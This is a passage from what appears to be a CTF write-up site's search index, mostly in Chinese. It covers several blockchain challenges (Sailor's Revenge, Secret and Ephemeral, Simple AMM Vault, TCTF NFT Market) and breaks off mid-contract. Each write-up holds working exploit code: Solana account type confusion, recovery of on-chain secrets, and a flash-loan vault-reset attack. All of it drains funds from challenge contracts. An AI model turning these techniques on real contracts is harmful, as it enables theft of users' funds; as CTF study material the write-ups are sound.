15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 use borsh ::{ BorshSerialize }; use solana_program ::{ account_info ::{ next_account_info , AccountInfo }, instruction ::{ AccountMeta , Instruction }, entrypoint :: ProgramResult , entrypoint , program :: invoke , pubkey :: Pubkey , system_program , }; #[derive(BorshSerialize)] pub enum SailorInstruction { CreateUnion ( u64 ), PayDues ( u64 ), StrikePay ( u64 ), RegisterMember ([ u8 ; 32 ]), } entrypoint ! ( process_instruction ); pub fn process_instruction ( _program_id : & Pubkey , accounts : & [ AccountInfo ], _instruction_data : & [ u8 ], ) -> ProgramResult { let iter = & mut accounts . iter (); let chall_id = next_account_info ( iter ) ? ; let registration = next_account_info ( iter ) ? ; let user = next_account_info ( iter ) ? ; let vault = next_account_info ( iter ) ? ; invoke ( & Instruction { program_id : * chall_id . key , data : SailorInstruction :: StrikePay ( 100_000_000 ). try_to_vec (). unwrap (), accounts : vec ! [ AccountMeta :: new ( * registration . key , false ), AccountMeta :: new ( * user . key , false ), AccountMeta :: new ( * user . key , true ), AccountMeta :: new ( * vault . key , false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ], }, & [ registration . clone (), user . clone (), vault . clone (), ] ) ? ; Ok (()) } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from pwn import * account_metas = [ ( \"program\" , \"-r\" ), # readonly ( \"registration\" , \"-w\" ), ( \"user\" , \"sw\" ), # signer + writable ( \"vault\" , \"-w\" ), ( \"system program\" , \"-r\" ), ] instruction_data = b \"\" p = remote ( \"challs.actf.co\" , 31404 ) with open ( \"solve/target/deploy/solve.so\" , \"rb\" ) as f : solve = f . read () p . sendlineafter ( b \"program len: \\n \" , str ( len ( solve )) . encode ()) p . send ( solve ) accounts = {} for l in p . recvuntil ( b \"num accounts: \\n \" , drop = True ) . strip () . split ( b \" \\n \" ): [ name , pubkey ] = l . decode () . split ( \": \" ) accounts [ name ] = pubkey p . sendline ( str ( len ( account_metas )) . encode ()) for ( name , perms ) in account_metas : p . sendline ( f \" { perms } { accounts [ name ] } \" . encode ()) p . sendlineafter ( b \"ix len: \\n \" , str ( len ( instruction_data )) . encode ()) p . send ( instruction_data ) p . interactive () Flag \u00b6 actf{maybe_anchor_can_kind_of_protect_me_from_my_own_stupidity}","title":"Sailor's Revenge"},{"location":"blockchain/sailors_revenge/#_1","text":"After the sailors were betrayed by their trusty anchor, they rewrote their union smart contract to be anchor-free! They even added a new registration feature so you can show off your union registration on the blockchain! nc challs.actf.co 31404 sailors_revenge.tar.gz","title":"\u9898\u76ee"},{"location":"blockchain/sailors_revenge/#_2","text":"\u76ee\u6807\u662f\u83b7\u53d6\u81f3\u5c11 \\(10^8\\) lamports 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 const TARGET_AMT : u64 = 100_000_000 ; // check solve let balance = challenge . env . get_account ( user . pubkey ()) . ok_or ( \"could not find user\" ) ? . lamports ; writeln! ( socket , \"lamports: {:?}\" , balance ) ? ; if balance > TARGET_AMT { let flag = fs :: read_to_string ( \"flag.txt\" ) ? ; writeln! ( socket , \"You successfully exploited the working class and stole their union dues! Congratulations! \\n Flag: {}\" , flag . trim () ) ? ; } else { writeln! ( socket , \"That's not enough to get the flag!\" ) ? ; } \u7a0b\u5e8f\u652f\u6301\u56db\u79cd\u6307\u4ee4 CreateUnion \u5411 vault \u53d1\u9001 bal lamports\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a\u8d26\u6237\u5b58\u50a8 SailorUnion \u7ed3\u6784\u7684\u6570\u636e\uff0c\u521d\u59cb available_funds \u4e3a 0 PayDues \u5f53 member \u7684\u4f59\u989d\u4e0d\u4f4e\u4e8e amt \u65f6\uff0c\u5c06 amt lamports \u4ece member \u8f6c\u79fb\u5230 vault \uff0c SailorUnion \u7684 available_funds \u589e\u52a0 amt StrikePay \u5f53 available_funds \u4e0d\u4f4e\u4e8e amt \u65f6\uff0c\u5c06 amt lamports \u4ece vault \u8f6c\u79fb\u5230 member \uff08\u589e\u52a0 user \u8d26\u6237\u4f59\u989d\u7684\u552f\u4e00\u65b9\u6cd5 :D\uff09 RegisterMember \u521b\u5efa\u4e00\u4e2a\u8d26\u6237\u5b58\u50a8 Registration \u7ed3\u6784\u7684\u6570\u636e\uff0c\u521d\u59cb balance \u4e3a -100 1 2 3 4 5 6 7 let ins = SailorInstruction :: try_from_slice ( instruction_data ) ? ; match ins { SailorInstruction :: CreateUnion ( bal ) => processor :: create_union ( program_id , accounts , bal ), SailorInstruction :: PayDues ( amt ) => processor :: pay_dues ( program_id , accounts , amt ), SailorInstruction :: StrikePay ( amt ) => processor :: strike_pay ( program_id , accounts , amt ), SailorInstruction :: RegisterMember ( member ) => processor :: register_member ( program_id , accounts , member ) } SailorUnion \u548c Registration \u7684\u5b57\u6bb5\u662f\u91cd\u5408\u7684\uff0c\u4e14 balance \u7684\u7c7b\u578b\u4e3a i64 \uff0c\u82e5\u6309\u7167 SailorUnion \u53cd\u5e8f\u5217\u5316 balance \u4e3a\u8d1f\u6570\u7684 Registration \u7c7b\u578b\u7684\u6570\u636e\uff0c\u5c06\u5f97\u5230\u4e00\u4e2a\u6570\u503c\u5f88\u5927\u7684 u64 \uff0c\u540c\u65f6 member \u5bf9\u5e94 authority 1 2 3 4 5 6 7 8 9 10 11 #[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq, PartialOrd, Ord)] pub struct SailorUnion { available_funds : u64 , authority : [ u8 ; 32 ], } #[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq, PartialOrd, Ord)] pub struct Registration { balance : i64 , member : [ u8 ; 32 ], } \u90a3\u4e48\uff0c\u5728\u8c03\u7528 strike_pay \u65f6\u5c06 rich_boi \u4e3a user \u6ce8\u518c\u7684 Registration \u8d26\u6237\u4f5c\u4e3a SailorUnion \u8d26\u6237\u4f20\u5165\u5c31\u53ef\u4ee5\u5566 (\u03a6\u02cb\u03c9\u02ca\u03a6)","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/sailors_revenge/#exploitation","text":"1 2 3 4 5 $ cargo new solve $ cd solve/ $ mv src/main.rs src/lib.rs $ cargo add solana_program borsh $ cargo-build-bpf Cargo.toml 1 2 3 4 5 6 7 8 9 10 11 [package] name = \"solve\" version = \"0.1.0\" edition = \"2021\" [dependencies] borsh = \"0.10.3\" solana-program = \"1.14.11\" [lib] crate-type = [ \"cdylib\" , \"rlib\" ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 use borsh ::{ BorshSerialize }; use solana_program ::{ account_info ::{ next_account_info , AccountInfo }, instruction ::{ AccountMeta , Instruction }, entrypoint :: ProgramResult , entrypoint , program :: invoke , pubkey :: Pubkey , system_program , }; #[derive(BorshSerialize)] pub enum SailorInstruction { CreateUnion ( u64 ), PayDues ( u64 ), StrikePay ( u64 ), RegisterMember ([ u8 ; 32 ]), } entrypoint ! ( process_instruction ); pub fn process_instruction ( _program_id : & Pubkey , accounts : & [ AccountInfo ], _instruction_data : & [ u8 ], ) -> ProgramResult { let iter = & mut accounts . iter (); let chall_id = next_account_info ( iter ) ? ; let registration = next_account_info ( iter ) ? ; let user = next_account_info ( iter ) ? ; let vault = next_account_info ( iter ) ? ; invoke ( & Instruction { program_id : * chall_id . key , data : SailorInstruction :: StrikePay ( 100_000_000 ). try_to_vec (). unwrap (), accounts : vec ! [ AccountMeta :: new ( * registration . key , false ), AccountMeta :: new ( * user . key , false ), AccountMeta :: new ( * user . key , true ), AccountMeta :: new ( * vault . key , false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ], }, & [ registration . clone (), user . clone (), vault . clone (), ] ) ? ; Ok (()) } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from pwn import * account_metas = [ ( \"program\" , \"-r\" ), # readonly ( \"registration\" , \"-w\" ), ( \"user\" , \"sw\" ), # signer + writable ( \"vault\" , \"-w\" ), ( \"system program\" , \"-r\" ), ] instruction_data = b \"\" p = remote ( \"challs.actf.co\" , 31404 ) with open ( \"solve/target/deploy/solve.so\" , \"rb\" ) as f : solve = f . read () p . sendlineafter ( b \"program len: \\n \" , str ( len ( solve )) . encode ()) p . send ( solve ) accounts = {} for l in p . recvuntil ( b \"num accounts: \\n \" , drop = True ) . strip () . split ( b \" \\n \" ): [ name , pubkey ] = l . decode () . split ( \": \" ) accounts [ name ] = pubkey p . sendline ( str ( len ( account_metas )) . encode ()) for ( name , perms ) in account_metas : p . sendline ( f \" { perms } { accounts [ name ] } \" . encode ()) p . sendlineafter ( b \"ix len: \\n \" , str ( len ( instruction_data )) . encode ()) p . send ( instruction_data ) p . interactive ()","title":"Exploitation"},{"location":"blockchain/sailors_revenge/#flag","text":"actf{maybe_anchor_can_kind_of_protect_me_from_my_own_stupidity}","title":"Flag"},{"location":"blockchain/secret_and_ephemeral/","tags":["smart contract"],"text":"#smart contract .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Can you recover the lost secrets of this contract and take what is (not) rightfully yours? Goal: Steal all the funds from the contract. SecretAndEphemeral.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /** * @title Secret And Ephemeral * @author Blue Alder (https://duc.tf) **/ contract SecretAndEphemeral { address private owner ; int256 public seconds_in_a_year = 60 * 60 * 24 * 365 ; string word_describing_ductf = \"epic\" ; string private not_yours ; mapping ( address => uint ) public cool_wallet_addresses ; bytes32 public spooky_hash ; constructor ( string memory _not_yours , uint256 _secret_number ) { not_yours = _not_yours ; spooky_hash = keccak256 ( abi . encodePacked ( not_yours , _secret_number , msg . sender )); } function giveTheFunds () payable public { require ( msg . value > 0.1 ether ); // Thank you for your donation cool_wallet_addresses [ msg . sender ] += msg . value ; } function retrieveTheFunds ( string memory secret , uint256 secret_number , address _owner_address ) public { bytes32 userHash = keccak256 ( abi . encodePacked ( secret , secret_number , _owner_address )); require ( userHash == spooky_hash , \"Somethings wrong :(\" ); // User authenticated, sending funds uint256 balance = address ( this ). balance ; payable ( msg . sender ). transfer ( balance ); } } \u89e3\u9898\u601d\u8def \u00b6 retrieveTheFunds \u9700\u8981\u83b7\u53d6 secret \u3001 secret_number \u4ee5\u53ca _owner_address \u4ee5\u4f7f\u5176\u54c8\u5e0c\u7ed3\u679c\u7b49\u4e8e spooky_hash \u8bb0\u5f55\u4e00\u4e0b\u901a\u8fc7 web3py \u904d\u5386\u67e5\u8be2\u5386\u53f2\u4ea4\u6613\u7684\u65b9\u6cd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from web3 import Web3 from web3.middleware import geth_poa_middleware import json , requests from eth_abi import decode_abi base_id = '210f92698054d42d' w3 = Web3 ( Web3 . HTTPProvider ( f \"https://blockchain-secretandephemeral- { base_id } -eth.2022.ductf.dev/\" )) w3 . middleware_onion . inject ( geth_poa_middleware , layer = 0 ) info = json . loads ( requests . get ( f 'https://blockchain-secretandephemeral- { base_id } .2022.ductf.dev/challenge' ) . content ) account = w3 . eth . account . from_key ( info [ 'player_wallet' ][ 'private_key' ]) contract_addr = info [ 'contract_address' ][ 0 ][ 'address' ] contract_abi = open ( 'abi.json' ) . read () contract = w3 . eth . contract ( address = contract_addr , abi = contract_abi ) for i in range ( w3 . eth . get_block_number (), - 1 , - 1 ): tx_hashes = w3 . eth . get_block ( i )[ 'transactions' ] for tx_hash in tx_hashes : tx = w3 . eth . get_transaction ( tx_hash ) if tx [ 'to' ] == None : owner = tx [ 'from' ] not_yours , secret_num = decode_abi ([ 'string' , 'uint256' ], bytes . fromhex ( tx [ 'input' ][ - 320 :])) # -320 \u6839\u636e\u89c2\u5bdf\u83b7\u5f97 break else : continue break tx = account . sign_transaction ( contract . functions . retrieveTheFunds ( not_yours , secret_num , owner ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'gas' : 1000000 , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gasPrice' : w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) w3 . eth . wait_for_transaction_receipt ( tx_hash ) print ( requests . get ( f 'https://blockchain-secretandephemeral- { base_id } .2022.ductf.dev/challenge/solve' ) . content ) Flag \u00b6 DUCTF{u_r_a_web3_t1me_7raveler_:)}","title":"Secret and Ephemeral"},{"location":"blockchain/secret_and_ephemeral/#_1","text":"Can you recover the lost secrets of this contract and take what is (not) rightfully yours? Goal: Steal all the funds from the contract. SecretAndEphemeral.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /** * @title Secret And Ephemeral * @author Blue Alder (https://duc.tf) **/ contract SecretAndEphemeral { address private owner ; int256 public seconds_in_a_year = 60 * 60 * 24 * 365 ; string word_describing_ductf = \"epic\" ; string private not_yours ; mapping ( address => uint ) public cool_wallet_addresses ; bytes32 public spooky_hash ; constructor ( string memory _not_yours , uint256 _secret_number ) { not_yours = _not_yours ; spooky_hash = keccak256 ( abi . encodePacked ( not_yours , _secret_number , msg . sender )); } function giveTheFunds () payable public { require ( msg . value > 0.1 ether ); // Thank you for your donation cool_wallet_addresses [ msg . sender ] += msg . value ; } function retrieveTheFunds ( string memory secret , uint256 secret_number , address _owner_address ) public { bytes32 userHash = keccak256 ( abi . encodePacked ( secret , secret_number , _owner_address )); require ( userHash == spooky_hash , \"Somethings wrong :(\" ); // User authenticated, sending funds uint256 balance = address ( this ). balance ; payable ( msg . sender ). transfer ( balance ); } }","title":"\u9898\u76ee"},{"location":"blockchain/secret_and_ephemeral/#_2","text":"retrieveTheFunds \u9700\u8981\u83b7\u53d6 secret \u3001 secret_number \u4ee5\u53ca _owner_address \u4ee5\u4f7f\u5176\u54c8\u5e0c\u7ed3\u679c\u7b49\u4e8e spooky_hash \u8bb0\u5f55\u4e00\u4e0b\u901a\u8fc7 web3py \u904d\u5386\u67e5\u8be2\u5386\u53f2\u4ea4\u6613\u7684\u65b9\u6cd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from web3 import Web3 from web3.middleware import geth_poa_middleware import json , requests from eth_abi import decode_abi base_id = '210f92698054d42d' w3 = Web3 ( Web3 . HTTPProvider ( f \"https://blockchain-secretandephemeral- { base_id } -eth.2022.ductf.dev/\" )) w3 . middleware_onion . inject ( geth_poa_middleware , layer = 0 ) info = json . loads ( requests . get ( f 'https://blockchain-secretandephemeral- { base_id } .2022.ductf.dev/challenge' ) . content ) account = w3 . eth . account . from_key ( info [ 'player_wallet' ][ 'private_key' ]) contract_addr = info [ 'contract_address' ][ 0 ][ 'address' ] contract_abi = open ( 'abi.json' ) . read () contract = w3 . eth . contract ( address = contract_addr , abi = contract_abi ) for i in range ( w3 . eth . get_block_number (), - 1 , - 1 ): tx_hashes = w3 . eth . get_block ( i )[ 'transactions' ] for tx_hash in tx_hashes : tx = w3 . eth . get_transaction ( tx_hash ) if tx [ 'to' ] == None : owner = tx [ 'from' ] not_yours , secret_num = decode_abi ([ 'string' , 'uint256' ], bytes . fromhex ( tx [ 'input' ][ - 320 :])) # -320 \u6839\u636e\u89c2\u5bdf\u83b7\u5f97 break else : continue break tx = account . sign_transaction ( contract . functions . retrieveTheFunds ( not_yours , secret_num , owner ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'gas' : 1000000 , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gasPrice' : w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) w3 . eth . wait_for_transaction_receipt ( tx_hash ) print ( requests . get ( f 'https://blockchain-secretandephemeral- { base_id } .2022.ductf.dev/challenge/solve' ) . content )","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/secret_and_ephemeral/#flag","text":"DUCTF{u_r_a_web3_t1me_7raveler_:)}","title":"Flag"},{"location":"blockchain/simple_amm_vault/","tags":["smart contract","vault reset attack","flashloan"],"text":"#smart contract #vault reset attack #flashloan .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 ERC-4626 was too complex, so I made an AMM to swap between shares and assets. nc challs.nusgreyhats.org 30301 Challenge Files Solution \u00b6 Initially, there are 1000 GREY deposited in the vault, 1000 GREY sent to the vault as rewards, and 2000 GREY in the pool. The player starts with 1000 GREY and need to have at least 3000 GREY to solve the challenge Users can receive distributed rewards by unstaking GREY. Since the pool offers zero-fee flash loans on GREY and SV tokens, we can borrow SV and withdraw all the GREY from the vault. The totalAssets and totalSupply will then return to zero, causing the share price to drop, then we can deposit 1000 GREY and repay the flash loan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function deposit ( uint256 assets ) external returns ( uint256 shares ) { shares = toSharesDown ( assets ); require ( shares != 0 , \"zero shares\" ); totalAssets += assets ; _mint ( msg . sender , shares ); GREY . transferFrom ( msg . sender , address ( this ), assets ); } function toSharesDown ( uint256 assets ) internal view returns ( uint256 ) { if ( totalAssets == 0 || totalSupply == 0 ) { return assets ; } return assets . mulDivDown ( totalSupply , totalAssets ); } After the flash loan, the share price dropped from 2e18 to 1e18 1 2 3 function sharePrice () external view returns ( uint256 ) { return totalSupply == 0 ? 1e18 : totalAssets . divWadDown ( totalSupply ); } The pool calculates K based on the share price and the amount of tokens reserved. The initial K is 2000e18 (1000e18 + 2000e18 * 1e18 / 2e18) 1 2 3 4 function computeK ( uint256 amountX , uint256 amountY ) internal view returns ( uint256 ) { uint256 price = VAULT . sharePrice (); return amountX + amountY . divWadDown ( price ); } Thus, 1000 GREY can be taken out from the pool without SV after the share price drops (1000e18 + 1000e18 * 1e18 / 1e18 >= 2000e18). Enough GREY is now obtained 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 modifier invariant { _ ; require ( computeK ( reserveX , reserveY ) >= k , \"K\" ); } function swap ( bool swapXForY , uint256 amountIn , uint256 amountOut ) external invariant { IERC20 tokenIn ; IERC20 tokenOut ; if ( swapXForY ) { reserveX += amountIn ; reserveY -= amountOut ; ( tokenIn , tokenOut ) = ( tokenX , tokenY ); } else { reserveX -= amountOut ; reserveY += amountIn ; ( tokenIn , tokenOut ) = ( tokenY , tokenX ); } tokenIn . transferFrom ( msg . sender , address ( this ), amountIn ); tokenOut . transfer ( msg . sender , amountOut ); } Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 contract Exploiter { SimpleVault public vault ; SimpleAMM public amm ; GREY public grey ; constructor ( Setup setup ) { vault = setup . vault (); amm = setup . amm (); grey = setup . grey (); grey . approve ( address ( vault ), type ( uint256 ). max ); setup . claim (); } function exploit () public { amm . flashLoan ( true , 1000 ether , \"\" ); amm . swap ( true , 0 , 1000 ether ); grey . transfer ( msg . sender , grey . balanceOf ( address ( this ))); } function onFlashLoan ( uint256 , bytes calldata ) external { require ( msg . sender == address ( amm )); vault . withdraw ( 1000 ether ); vault . deposit ( 1000 ether ); vault . approve ( address ( amm ), 1000 ether ); } } Flag \u00b6 grey{vault_reset_attack_a3e7a42b511cf0a8}","title":"Simple Amm Vault"},{"location":"blockchain/simple_amm_vault/#description","text":"ERC-4626 was too complex, so I made an AMM to swap between shares and assets. nc challs.nusgreyhats.org 30301 Challenge Files","title":"Description"},{"location":"blockchain/simple_amm_vault/#solution","text":"Initially, there are 1000 GREY deposited in the vault, 1000 GREY sent to the vault as rewards, and 2000 GREY in the pool. The player starts with 1000 GREY and need to have at least 3000 GREY to solve the challenge Users can receive distributed rewards by unstaking GREY. Since the pool offers zero-fee flash loans on GREY and SV tokens, we can borrow SV and withdraw all the GREY from the vault. The totalAssets and totalSupply will then return to zero, causing the share price to drop, then we can deposit 1000 GREY and repay the flash loan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function deposit ( uint256 assets ) external returns ( uint256 shares ) { shares = toSharesDown ( assets ); require ( shares != 0 , \"zero shares\" ); totalAssets += assets ; _mint ( msg . sender , shares ); GREY . transferFrom ( msg . sender , address ( this ), assets ); } function toSharesDown ( uint256 assets ) internal view returns ( uint256 ) { if ( totalAssets == 0 || totalSupply == 0 ) { return assets ; } return assets . mulDivDown ( totalSupply , totalAssets ); } After the flash loan, the share price dropped from 2e18 to 1e18 1 2 3 function sharePrice () external view returns ( uint256 ) { return totalSupply == 0 ? 1e18 : totalAssets . divWadDown ( totalSupply ); } The pool calculates K based on the share price and the amount of tokens reserved. The initial K is 2000e18 (1000e18 + 2000e18 * 1e18 / 2e18) 1 2 3 4 function computeK ( uint256 amountX , uint256 amountY ) internal view returns ( uint256 ) { uint256 price = VAULT . sharePrice (); return amountX + amountY . divWadDown ( price ); } Thus, 1000 GREY can be taken out from the pool without SV after the share price drops (1000e18 + 1000e18 * 1e18 / 1e18 >= 2000e18). Enough GREY is now obtained 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 modifier invariant { _ ; require ( computeK ( reserveX , reserveY ) >= k , \"K\" ); } function swap ( bool swapXForY , uint256 amountIn , uint256 amountOut ) external invariant { IERC20 tokenIn ; IERC20 tokenOut ; if ( swapXForY ) { reserveX += amountIn ; reserveY -= amountOut ; ( tokenIn , tokenOut ) = ( tokenX , tokenY ); } else { reserveX -= amountOut ; reserveY += amountIn ; ( tokenIn , tokenOut ) = ( tokenY , tokenX ); } tokenIn . transferFrom ( msg . sender , address ( this ), amountIn ); tokenOut . transfer ( msg . sender , amountOut ); }","title":"Solution"},{"location":"blockchain/simple_amm_vault/#exploitation","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 contract Exploiter { SimpleVault public vault ; SimpleAMM public amm ; GREY public grey ; constructor ( Setup setup ) { vault = setup . vault (); amm = setup . amm (); grey = setup . grey (); grey . approve ( address ( vault ), type ( uint256 ). max ); setup . claim (); } function exploit () public { amm . flashLoan ( true , 1000 ether , \"\" ); amm . swap ( true , 0 , 1000 ether ); grey . transfer ( msg . sender , grey . balanceOf ( address ( this ))); } function onFlashLoan ( uint256 , bytes calldata ) external { require ( msg . sender == address ( amm )); vault . withdraw ( 1000 ether ); vault . deposit ( 1000 ether ); vault . approve ( address ( amm ), 1000 ether ); } }","title":"Exploitation"},{"location":"blockchain/simple_amm_vault/#flag","text":"grey{vault_reset_attack_a3e7a42b511cf0a8}","title":"Flag"},{"location":"blockchain/tctf_nft_market/","tags":["smart contract","head overflow"],"text":"#smart contract #head overflow .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Welcome to TCTF NFT Market, a secure, open-source, and decentralized NFT marketplace! Trade your favourite NFTs (and flag) here! nc 47.102.40.39 20000 \u89e3\u9898\u601d\u8def \u00b6 PoW.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import itertools , pwn from hashlib import sha256 from string import ascii_letters , digits table = ascii_letters + digits conn = pwn . remote ( '47.102.40.39' , 20000 ) ret = conn . recvline_contains ( 'sha256' ) . decode () base = ret [ ret . find ( '(' ) + 1 : ret . find ( '+ ???' )] . strip () for ch in itertools . permutations ( table , 4 ): m = base + '' . join ( ch ) if sha256 ( m . encode ()) . hexdigest () . endswith ( '00000' ): conn . sendafter ( '[-] ??? =' , f ' { m [ - 4 :] } \\n ' ) break conn . interactive () \u6301\u6709 tokenId \u4e3a 1\u30012\u30013 \u7684 TNFT \u5373\u53ef\u89e6\u53d1\u4e8b\u4ef6 SendFlag \u53ef\u4ee5\u8c03\u7528\u4e00\u6b21 airdrop() \u83b7\u5f97 5 TTK \u5f53\u6301\u6709\u6216\u88ab\u6279\u51c6\u4f7f\u7528 TNFT \u65f6\uff0c\u53ef\u4ee5 createOrder() \u6216 cancelOrder() \u5f53\u6301\u6709\u8db3\u591f TTK \u65f6\u53ef\u4ee5 purchaseOrder() \u53ef\u4ee5\u4f7f\u7528\u7ecf TNFT \u6240\u6709\u8005\u7b7e\u540d\u7684 coupon \u8c03\u7528\u4e00\u6b21 purchaseWithCoupon() \uff0c\u4ee5\u4fee\u6539\u540e\u7684\u4ef7\u683c\u8fdb\u884c\u8d2d\u4e70 \u53ef\u4ee5\u8fdb\u884c\u4e00\u6b21 purchaseTest() \uff0c TctfMarket \u5c06\u81ea\u5df1\u5b8c\u6210\u8ba2\u5355\u7684\u521b\u5efa\u4e0e\u8d2d\u4e70\uff0c\u7531\u4e8e approve \u4e0d\u80fd\u6388\u6743\u7ed9\u6240\u6709\u8005\uff0c\u53ef\u4ee5\u5229\u7528 purchaseTest() \u6765\u8f6c\u79fb TctfMarket \u7684 TTK task.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.15 ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"@openzeppelin/contracts/access/Ownable.sol\" ; contract TctfNFT is ERC721 , Ownable { constructor () ERC721 ( \"TctfNFT\" , \"TNFT\" ) { _setApprovalForAll ( address ( this ), msg . sender , true ); } function mint ( address to , uint256 tokenId ) external onlyOwner { _mint ( to , tokenId ); } } contract TctfToken is ERC20 { bool airdropped ; constructor () ERC20 ( \"TctfToken\" , \"TTK\" ) { _mint ( address ( this ), 100000000000 ); _mint ( msg . sender , 1337 ); } function airdrop () external { require ( ! airdropped , \"Already airdropped\" ); airdropped = true ; _mint ( msg . sender , 5 ); } } struct Order { address nftAddress ; uint256 tokenId ; uint256 price ; } struct Coupon { uint256 orderId ; uint256 newprice ; address issuer ; address user ; bytes reason ; } struct Signature { uint8 v ; bytes32 [ 2 ] rs ; } struct SignedCoupon { Coupon coupon ; Signature signature ; } contract TctfMarket { event SendFlag (); event NFTListed ( address indexed seller , address indexed nftAddress , uint256 indexed tokenId , uint256 price ); event NFTCanceled ( address indexed seller , address indexed nftAddress , uint256 indexed tokenId ); event NFTBought ( address indexed buyer , address indexed nftAddress , uint256 indexed tokenId , uint256 price ); bool tested ; TctfNFT public tctfNFT ; TctfToken public tctfToken ; CouponVerifierBeta public verifier ; Order [] orders ; constructor () { tctfToken = new TctfToken (); tctfToken . approve ( address ( this ), type ( uint256 ). max ); tctfNFT = new TctfNFT (); tctfNFT . mint ( address ( tctfNFT ), 1 ); tctfNFT . mint ( address ( this ), 2 ); tctfNFT . mint ( address ( this ), 3 ); verifier = new CouponVerifierBeta (); orders . push ( Order ( address ( tctfNFT ), 1 , 1 )); orders . push ( Order ( address ( tctfNFT ), 2 , 1337 )); orders . push ( Order ( address ( tctfNFT ), 3 , 13333333337 )); } function getOrder ( uint256 orderId ) public view returns ( Order memory order ) { require ( orderId < orders . length , \"Invalid orderId\" ); order = orders [ orderId ]; } function createOrder ( address nftAddress , uint256 tokenId , uint256 price ) external returns ( uint256 ) { require ( price > 0 , \"Invalid price\" ); require ( isNFTApprovedOrOwner ( nftAddress , msg . sender , tokenId ), \"Not owner\" ); orders . push ( Order ( nftAddress , tokenId , price )); emit NFTListed ( msg . sender , nftAddress , tokenId , price ); return orders . length - 1 ; } function cancelOrder ( uint256 orderId ) external { Order memory order = getOrder ( orderId ); require ( isNFTApprovedOrOwner ( order . nftAddress , msg . sender , order . tokenId ), \"Not owner\" ); _deleteOrder ( orderId ); emit NFTCanceled ( msg . sender , order . nftAddress , order . tokenId ); } function purchaseOrder ( uint256 orderId ) external { Order memory order = getOrder ( orderId ); _deleteOrder ( orderId ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); tctfToken 